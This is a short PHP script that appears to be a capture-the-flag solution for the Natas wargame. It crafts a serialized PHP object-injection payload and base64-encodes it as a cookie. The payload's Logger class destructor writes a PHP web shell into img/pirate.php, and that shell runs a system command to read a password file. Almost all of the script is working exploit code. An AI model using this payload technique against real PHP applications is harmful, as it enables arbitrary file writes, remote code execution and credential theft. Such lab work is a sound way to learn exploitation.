<?php

$drawing = 'YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjAiO3M6MjoieTEiO3M6MToiMCI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjAiO319';

class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
            $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/pirate.php";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
$array = new Logger('');

// $drawing_uns = unserialize(base64_decode($drawing));
// print_r($drawing_uns);

$encodedCookie = base64_encode(serialize($array));
echo($encodedCookie);





?>